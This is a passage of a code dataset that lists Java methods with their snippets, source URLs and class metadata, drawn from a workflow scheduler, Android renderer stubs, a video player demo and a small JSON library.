}", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "resetForRetry", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void resetForRetry() {    super.resetForRetry();    this.setStatus(Status.RUNNING);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getUserProps", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,String>", "snippet": "  public Map<String, String> getUserProps() {    return userProps;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setUserProps", "params": ["Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setUserProps(Map<String, String> userProps) {    this.userProps = userProps;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getFlowFailedRetry", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,String>", "snippet": "  public Map<String, String> getFlowFailedRetry() {    return flowFailedRetry;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setFlowFailedRetry", "params": ["Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setFlowFailedRetry(Map<String, String> flowFailedRetry) {    this.flowFailedRetry = flowFailedRetry;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getFailedSkipedAllJobs", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean getFailedSkipedAllJobs() {    return failedSkipedAllJobs;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setFailedSkipedAllJobs", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setFailedSkipedAllJobs(boolean failedSkipedAllJobs) {    this.failedSkipedAllJobs = failedSkipedAllJobs;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getJobOutputGlobalParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ConcurrentHashMap<String,String>", "snippet": "  public ConcurrentHashMap<String, String> getJobOutputGlobalParam() {    return jobOutputGlobalParam;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setJobOutputGlobalParam", "params": ["ConcurrentHashMap<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setJobOutputGlobalParam(ConcurrentHashMap<String, String> jobOutputGlobalParam) {    this.jobOutputGlobalParam = jobOutputGlobalParam;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "addJobOutputGlobalParam", "params": ["ConcurrentHashMap<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void addJobOutputGlobalParam(ConcurrentHashMap<String, String> jobOutputParam) {    this.jobOutputGlobalParam.putAll(jobOutputParam);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getConfiguration", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "  protected String getConfiguration() {    return \"cglib\";  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_proxyfactory_comparison/CglibLazyTest.java", "stars": "15", "class": {"name": "CglibLazyTest", "extends": "AbstractLazyTest", "implements": null, "modifiers": ["public"]}}, {"method_name": "invalidate", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void invalidate ()\t{\t\tn_invalidate ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ImageButtonRenderer.java", "stars": "2", "class": {"name": "ImageButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "n_invalidate", "params": [], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_invalidate ();\tpublic void draw (android.graphics.Canvas p0)\t{\t\tn_draw (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ImageButtonRenderer.java", "stars": "2", "class": {"name": "ImageButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "draw", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void draw (android.graphics.Canvas p0)\t{\t\tn_draw (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ImageButtonRenderer.java", "stars": "2", "class": {"name": "ImageButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "n_draw", "params": ["android"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_draw (android.graphics.Canvas p0);\tpublic boolean onTouchEvent (android.view.MotionEvent p0)\t{\t\treturn n_onTouchEvent (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ImageButtonRenderer.java", "stars": "2", "class": {"name": "ImageButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "onTouchEvent", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onTouchEvent (android.view.MotionEvent p0)\t{\t\treturn n_onTouchEvent (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ImageButtonRenderer.java", "stars": "2", "class": {"name": "ImageButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "n_onTouchEvent", "params": ["android"], "throws": null, "modifiers": ["native", "private"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onTouchEvent (android.view.MotionEvent p0);\tpublic void onFocusChange (android.view.View p0, boolean p1)\t{\t\tn_onFocusChange (p0, p1);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ImageButtonRenderer.java", "stars": "2", "class": {"name": "ImageButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "onFocusChange", "params": ["android", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onFocusChange (android.view.View p0, boolean p1)\t{\t\tn_onFocusChange (p0, p1);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ImageButtonRenderer.java", "stars": "2", "class": {"name": "ImageButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "n_onFocusChange", "params": ["android", "boolean"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onFocusChange (android.view.View p0, boolean p1);\tpublic void onClick (android.view.View p0)\t{\t\tn_onClick (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ImageButtonRenderer.java", "stars": "2", "class": {"name": "ImageButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "onClick", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onClick (android.view.View p0)\t{\t\tn_onClick (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ImageButtonRenderer.java", "stars": "2", "class": {"name": "ImageButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "n_onClick", "params": ["android"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onClick (android.view.View p0);\tpublic boolean onTouch (android.view.View p0, android.view.MotionEvent p1)\t{\t\treturn n_onTouch (p0, p1);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ImageButtonRenderer.java", "stars": "2", "class": {"name": "ImageButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "onTouch", "params": ["android", "android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onTouch (android.view.View p0, android.view.MotionEvent p1)\t{\t\treturn n_onTouch (p0, p1);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ImageButtonRenderer.java", "stars": "2", "class": {"name": "ImageButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "n_onTouch", "params": ["android", "android"], "throws": null, "modifiers": ["native", "private"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onTouch (android.view.View p0, android.view.MotionEvent p1);\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ImageButtonRenderer.java", "stars": "2", "class": {"name": "ImageButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ImageButtonRenderer.java", "stars": "2", "class": {"name": "ImageButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ImageButtonRenderer.java", "stars": "2", "class": {"name": "ImageButtonRenderer", "extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_detail_player);        ButterKnife.bind(this);        String url =  getUrl();        //\u589e\u52a0\u5c01\u9762        ImageView imageView = new ImageView(this);        imageView.setScaleType(ImageView.ScaleType.CENTER_CROP);        imageView.setImageResource(R.mipmap.xxx1);        resolveNormalVideoUI();        //\u5916\u90e8\u8f85\u52a9\u7684\u65cb\u8f6c\uff0c\u5e2e\u52a9\u5168\u5c4f        orientationUtils = new OrientationUtils(this, detailPlayer);        //\u521d\u59cb\u5316\u4e0d\u6253\u5f00\u5916\u90e8\u7684\u65cb\u8f6c        orientationUtils.setEnable(false);        Map<String, String> header = new HashMap<>();        header.put(\"ee\", \"33\");        header.put(\"allowCrossProtocolRedirects\", \"true\");        GSYVideoOptionBuilder gsyVideoOption = new GSYVideoOptionBuilder();        gsyVideoOption.setThumbImageView(imageView)                .setIsTouchWiget(true)                .setRotateViewAuto(false)                .setLockLand(false)                .setAutoFullWithSize(false)                .setShowFullAnimation(false)                .setNeedLockFull(true)                .setUrl(url)                .setMapHeadData(header)                .setCacheWithPlay(false)                .setVideoTitle(\"\u6d4b\u8bd5\u89c6\u9891\")                .setVideoAllCallBack(new GSYSampleCallBack() {                    @Override                    public void onPrepared(String url, Object... objects) {                        Debuger.printfError(\"***** onPrepared **** \" + objects[0]);                        Debuger.printfError(\"***** onPrepared **** \" + objects[1]);                        super.onPrepared(url, objects);                        //\u5f00\u59cb\u64ad\u653e\u4e86\u624d\u80fd\u65cb\u8f6c\u548c\u5168\u5c4f                        orientationUtils.setEnable(true);                        isPlay = true;                        //\u8bbe\u7f6e seek \u7684\u4e34\u8fd1\u5e27\u3002                        if(detailPlayer.getGSYVideoManager().getPlayer() instanceof Exo2PlayerManager) {                            ((Exo2PlayerManager) detailPlayer.getGSYVideoManager().getPlayer()).setSeekParameter(SeekParameters.NEXT_SYNC);                            Debuger.printfError(\"***** setSeekParameter **** \");                        }                    }                    @Override                    public void onEnterFullscreen(String url, Object... objects) {                        super.onEnterFullscreen(url, objects);                        Debuger.printfError(\"***** onEnterFullscreen **** \" + objects[0]);//title                        Debuger.printfError(\"***** onEnterFullscreen **** \" + objects[1]);//\u5f53\u524d\u5168\u5c4fplayer                    }                    @Override                    public void onAutoComplete(String url, Object... objects) {                        super.onAutoComplete(url, objects);                    }                    @Override                    public void onClickStartError(String url, Object... objects) {                        super.onClickStartError(url, objects);                    }                    @Override                    public void onQuitFullscreen(String url, Object... objects) {                        super.onQuitFullscreen(url, objects);                        Debuger.printfError(\"***** onQuitFullscreen **** \" + objects[0]);//title                        Debuger.printfError(\"***** onQuitFullscreen **** \" + objects[1]);//\u5f53\u524d\u975e\u5168\u5c4fplayer                        if (orientationUtils != null) {                            orientationUtils.backToProtVideo();                        }                    }                })                .setLockClickListener(new LockClickListener() {                    @Override                    public void onClick(View view, boolean lock) {                        if (orientationUtils != null) {                            //\u914d\u5408\u4e0b\u65b9\u7684onConfigurationChanged                            orientationUtils.setEnable(!lock);                        }                    }                })                .setGSYVideoProgressListener(new GSYVideoProgressListener() {                    @Override                    public void onProgress(int progress, int secProgress, int currentPosition, int duration) {                        Debuger.printfLog(\" progress \" + progress + \" secProgress \" + secProgress + \" currentPosition \" + currentPosition + \" duration \" + duration);                    }                })                .build(detailPlayer);        detailPlayer.getFullscreenButton().setOnClickListener(new View.OnClickListener() {            @Override            public void onClick(View v) {                //\u76f4\u63a5\u6a2a\u5c4f                orientationUtils.resolveByClick();                //\u7b2c\u4e00\u4e2atrue\u662f\u5426\u9700\u8981\u9690\u85cfactionbar\uff0c\u7b2c\u4e8c\u4e2atrue\u662f\u5426\u9700\u8981\u9690\u85cfstatusbar                detailPlayer.startWindowFullscreen(DetailNormalActivityPlayer.this, false, true);            }        });    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailNormalActivityPlayer.java", "stars": "2", "class": {"name": "DetailNormalActivityPlayer", "extends": "Activity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onBackPressed", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBackPressed() {        if (orientationUtils != null) {            orientationUtils.backToProtVideo();        }        if (GSYVideoManager.backFromWindowFull(this)) {            return;        }        super.onBackPressed();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailNormalActivityPlayer.java", "stars": "2", "class": {"name": "DetailNormalActivityPlayer", "extends": "Activity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onPause", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onPause() {        getCurPlay().onVideoPause();        super.onPause();        isPause = true;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailNormalActivityPlayer.java", "stars": "2", "class": {"name": "DetailNormalActivityPlayer", "extends": "Activity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onResume", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onResume() {        getCurPlay().onVideoResume(false);        super.onResume();        isPause = false;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailNormalActivityPlayer.java", "stars": "2", "class": {"name": "DetailNormalActivityPlayer", "extends": "Activity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onDestroy", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDestroy() {        super.onDestroy();        if (isPlay) {            getCurPlay().release();        }        //GSYPreViewManager.instance().releaseMediaPlayer();        if (orientationUtils != null)            orientationUtils.releaseListener();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailNormalActivityPlayer.java", "stars": "2", "class": {"name": "DetailNormalActivityPlayer", "extends": "Activity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onConfigurationChanged", "params": ["Configuration"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onConfigurationChanged(Configuration newConfig) {        super.onConfigurationChanged(newConfig);        //\u5982\u679c\u65cb\u8f6c\u4e86\u5c31\u5168\u5c4f        if (isPlay && !isPause) {            detailPlayer.onConfigurationChanged(this, newConfig, orientationUtils, true, true);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailNormalActivityPlayer.java", "stars": "2", "class": {"name": "DetailNormalActivityPlayer", "extends": "Activity", "implements": null, "modifiers": ["public"]}}, {"method_name": "resolveNormalVideoUI", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void resolveNormalVideoUI() {        //\u589e\u52a0title        detailPlayer.getTitleTextView().setVisibility(View.GONE);        detailPlayer.getBackButton().setVisibility(View.GONE);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailNormalActivityPlayer.java", "stars": "2", "class": {"name": "DetailNormalActivityPlayer", "extends": "Activity", "implements": null, "modifiers": ["public"]}}, {"method_name": "getCurPlay", "params": [], "throws": null, "modifiers": ["private"], "return_type": "GSYVideoPlayer", "snippet": "    private GSYVideoPlayer getCurPlay() {        if (detailPlayer.getFullWindowPlayer() != null) {            return  detailPlayer.getFullWindowPlayer();        }        return detailPlayer;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailNormalActivityPlayer.java", "stars": "2", "class": {"name": "DetailNormalActivityPlayer", "extends": "Activity", "implements": null, "modifiers": ["public"]}}, {"method_name": "getUrl", "params": [], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String getUrl() {        return \"http://9890.vod.myqcloud.com/9890_4e292f9a3dd011e6b4078980237cc3d3.f20.mp4\";    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailNormalActivityPlayer.java", "stars": "2", "class": {"name": "DetailNormalActivityPlayer", "extends": "Activity", "implements": null, "modifiers": ["public"]}}, {"method_name": "toJSONString", "params": ["JSONObject", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String toJSONString(JSONObject model, int indent) {        return toJSONString(model, 0, indent);    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/util/JSON.java", "stars": "2", "class": {"name": "JSON", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toJSONString", "params": ["JSONObject"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String toJSONString(JSONObject model) {        return toJSONString(model, 0, 0);    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/util/JSON.java", "stars": "2", "class": {"name": "JSON", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toJSONString", "params": ["JSONArray", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String toJSONString(JSONArray array, int indent) {        return toJSONString(array, 0, indent);    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/util/JSON.java", "stars": "2", "class": {"name": "JSON", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toJSONString", "params": ["JSONArray"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String toJSONString(JSONArray array) {        return toJSONString(array, 0, 0);    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/util/JSON.java", "stars": "2", "class": {"name": "JSON", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toJSONString", "params": ["JSONObject", "int", "int"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "    private static String toJSONString(@NotNull JSONObject model, int depth, final int indent) {        // \u4ee5\u5de6\u5927\u62ec\u53f7\u4f5c\u4e3a\u8d77\u59cb        StringBuilder sb = new StringBuilder();        sb.append('{');        depth++;        // \u8ba1\u7b97\u7f29\u8fdb        String indentStr = calcIndent(depth, indent);        Set<Map.Entry<String, Object>> entries = model.entrySet();        final int size = entries.size();        int i = 0;        for (Map.Entry<String, Object> entry : model.entrySet()) {            String key = entry.getKey();            Object val = entry.getValue();            // <indent>\"<key>\":<space>            if (indent > 0) sb.append('\\n');            sb.append(indentStr).append('\"').append(key).append(\"\\\":\");            if (indent > 0) sb.append(' ');            if (val instanceof JSONObject) {                sb.append(toJSONString((JSONObject) val, depth, indent));            } else if (val instanceof JSONArray) {                sb.append(toJSONString((JSONArray) val, depth, indent));            } else if (val instanceof String) {                sb.append('\"').append(val).append('\"');            } else {                sb.append(val);            }            if (i < size - 1) sb.append(',');            else if (indent > 0) sb.append('\\n');            i++;        }        // \u7ed3\u675f\u89e3\u6790        depth--;        sb.append(calcIndent(depth, indent)).append('}');        return sb.toString();    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/util/JSON.java", "stars": "2", "class": {"name": "JSON", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toJSONString", "params": ["JSONArray", "int", "int"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "    private static String toJSONString(@NotNull JSONArray array, int depth, final int indent) {        StringBuilder sb = new StringBuilder();        sb.append('[');        depth++;        String indentStr = calcIndent(depth, indent);        for (int i = 0, size = array.size(); i < size; i++) {            if (indent > 0) sb.append('\\n');            Object item = array.get(i);            if (item instanceof JSONObject) {                sb.append(toJSONString((JSONObject) item, depth, indent));            } else if (item instanceof JSONArray) {                sb.append(toJSONString((JSONArray) item, depth, indent));            } else if (item instanceof String) {                sb.append(indentStr).append('\"').append(item).append('\"');            } else {                sb.append(indentStr).append(item);            }            if (i < size - 1) sb.append(',');            else if (indent > 0) sb.append('\\n');        }        depth--;        sb.append(calcIndent(depth, indent)).append(']');        return sb.toString();    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/util/JSON.java", "stars": "2", "class": {"name": "JSON", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "calcIndent", "params": ["int", "int"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "    private static String calcIndent(int depth, int indent) {        if (indent <= 0) return \"\";        StringBuilder sb = new StringBuilder();        for (int i = 0, size = depth * indent; i < size; i++) {            sb.append(SPACE_CHAR);        }        return sb.toString();    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/util/JSON.java", "stars": "2", "class": {"name": "JSON", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "parseJSONObject", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "JSONObject", "snippet": "    public static JSONObject parseJSONObject(String source) {        try {            CharReader reader   = new CharReader(new StringReader(source));            TokenList tokenList = tokenizer.tokenize(reader);            return parser.parseJSONObject(tokenList);        } catch (IOException e) {            throw new RuntimeException(e);        }    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/util/JSON.java", "stars": "2", "class": {"name": "JSON", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "parseJSONArray", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "JSONArray", "snippet": "    public static JSONArray parseJSONArray(String source) {        try {            CharReader reader   = new CharReader(new StringReader(source));            TokenList tokenList = tokenizer.tokenize(reader);            return parser.parseJSONArray(tokenList);        } catch (IOException e) {            throw new RuntimeException(e);        }    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/util/JSON.java", "stars": "2", "class": {"name": "JSON", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toJSONObject", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "JSONObject", "snippet": "    public static JSONObject toJSONObject(Object obj) {        if (obj == null) return null;        if (ReflectUtil.isList(obj)) {            throw new JSONTypeException(\"Type of value is not JSONObject\");        }        JSONObject model = new JSONObject();        toJSONObject(obj, model);        return model;    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/util/JSON.java", "stars": "2", "class": {"name": "JSON", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toJSONArray", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "JSONArray", "snippet": "    public static JSONArray toJSONArray(Object obj) {        if (obj == null) return null;        if (!ReflectUtil.isList(obj)) {            throw new JSONTypeException(\"Type of value is not JSONArray\");        }        JSONArray array = new JSONArray();        toJSONArray(obj, array);        return array;    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/util/JSON.java", "stars": "2", "class": {"name": "JSON", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toJSONObject", "params": ["Object", "JSONObject"], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void toJSONObject(Object obj, JSONObject model) {        if (!ReflectUtil.isMap(obj)) {            toJSONObject(ReflectUtil.objectToMap(obj), model);        } else {            toJSONObject((Map<?, ?>) obj, model);        }    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/util/JSON.java", "stars": "2", "class": {"name": "JSON", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toJSONObject", "params": ["Map<?,?>", "JSONObject"], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void toJSONObject(@NotNull Map<?, ?> map, JSONObject model) {        for (Map.Entry<?, ?> entry : map.entrySet()) {            String key = entry.getKey().toString();            Object val = entry.getValue();            // \u5904\u7406JSON\u7684\u57fa\u672c\u7c7b\u578b            if (ReflectUtil.isNotJSONObject(val)) {                model.put(key, val);            }            // \u5904\u7406JSON\u5217\u8868            else if (ReflectUtil.isList(val)) {                JSONArray array = new JSONArray();                toJSONArray(val, array);                model.put(key, array);            }            // \u5982\u679c\u53c8\u662f\u4e00\u4e2aMap            else if (ReflectUtil.isMap(val)) {                JSONObject subModel = new JSONObject();                toJSONObject((Map<?, ?>) val, subModel);                model.put(key, subModel);            }            // \u5904\u7406\u65f6\u95f4\u5bf9\u8c61\uff1aLocalDateTime\u3001LocalDate\u3001LocalTime            else if (ReflectUtil.isDateTime(val)) {                model.put(key, StringUtil.dateTimeToString((TemporalAccessor) val));            }            // \u5904\u7406\u5176\u4ed6\u5bf9\u8c61            else {                